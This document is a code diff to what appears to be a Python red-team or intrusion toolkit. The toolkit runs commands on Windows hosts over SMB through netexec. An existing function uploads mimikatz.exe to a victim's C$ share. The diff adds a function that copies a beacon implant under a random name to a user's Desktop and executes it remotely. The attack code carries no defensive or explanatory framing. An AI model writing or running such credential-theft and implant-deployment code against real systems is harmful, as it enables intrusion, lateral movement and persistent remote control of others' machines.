@@ -1,4 +1,5 @@
 import subprocess
+import uuid
 
 def execute_powershell(target: str, username: str, password: str, domain: str, ps_command: str, use_hash: bool = False) -> tuple[bool,str]:
     cmd = ['nxc', 'smb', target, '-u', username, '-d', domain]
@@ -39,3 +40,15 @@ def execute_cmd(target: str, username: str, password: str, domain: str, ps_comma
 def drop_mimikatz(user: str, password: str, ip: str) -> None:
         smb_command = f"smbclient //{ip}/C$ -U {user}%'{password}' -c 'put mimikatz.exe Users\\{user}\\Desktop\\mimikatz.exe'"
         subprocess.run(smb_command, shell=True)
+
+def drop_beacon(target: str, user: str, password: str, domain: str) -> None:
+    beacon_name = f'beacon_{uuid.uuid4().hex[:8]}.exe'
+    cmd = [
+        'smbclient', f'//{target}/C$',
+        '-U', f'{user}%{password}',
+        '-c', f'put beacon_x64.exe Users\\{user}\\Desktop\\{beacon_name}'
+    ]
+    subprocess.run(cmd)
+
+    run_cmd = f'cmd /c C:\\Users\\{user}\\Desktop\\{beacon_name}'
+    execute_cmd(target, user, password, domain, run_cmd)
